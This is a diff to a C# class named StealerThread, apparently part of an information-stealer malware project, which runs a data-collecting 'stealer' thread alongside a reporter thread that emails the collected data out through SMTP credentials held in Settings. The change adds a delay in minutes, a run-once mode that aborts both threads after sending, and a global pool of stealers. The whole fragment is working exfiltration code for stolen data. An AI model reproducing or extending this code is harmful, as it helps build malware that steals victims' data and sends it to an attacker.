@@ -8,34 +8,45 @@ namespace sub
     {
         private Thread _stealer;
         private Thread _reporter;
+        private int _delay;
 
-        public StealerThread(IStealer stealer)
+        public StealerThread(IStealer stealer, int delay)
         {
+            _delay = delay;
             _stealer = new Thread(stealer.Collect);
-            _reporter = new Thread(delegate(object delay)
+            _reporter = new Thread(delegate()
                                        {
                                            while (true)
                                            {
-                                               Thread.Sleep((int) delay);
+                                               bool runOnce = _delay <= 0;
+                                               if (!runOnce)
+                                               {
+                                                   Thread.Sleep(_delay*60000);
+                                               }
                                                MessageBox.Show(stealer.Data);
                                                new ReportEmail(stealer.GetType().Name, Settings.EmailAddress,
                                                                Settings.EmailPassword,
-                                                               Settings.SmtpAddress, Settings.SmtpPort).Send(stealer.Data);
+                                                               Settings.SmtpAddress, Settings.SmtpPort).Send(
+                                                                   stealer.Data);
+                                               if (runOnce)
+                                               {
+                                                   _stealer.Abort();
+                                                   _reporter.Abort();
+                                               }
                                            }
                                        });
+            Variables.stealerPool.Add(this);
         }
 
-        public void Start(int param)
+        public void Start()
         {
             _stealer.Start();
-            if (param != -1)
-            {
-                _reporter.Start(param*60000); //This will change it to minutes
-            } 
-            else
-            {
-                _reporter.Start();
-            }
+            _reporter.Start();
+        }
+
+        public int GetDelay()
+        {
+            return _delay;
         }
 
         public Thread GetStealerThread()
